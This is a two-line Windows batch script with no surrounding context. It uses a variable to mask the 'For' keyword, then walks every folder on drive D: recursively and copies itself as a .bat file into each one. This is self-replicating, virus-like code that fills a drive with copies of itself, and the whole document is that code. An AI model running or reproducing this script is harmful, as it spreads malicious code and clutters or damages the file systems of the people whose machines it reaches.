set f=For

%f% /R "D:\" /D %%a in (*) do copy %0 "%%~fa\%%~nxa.bat"
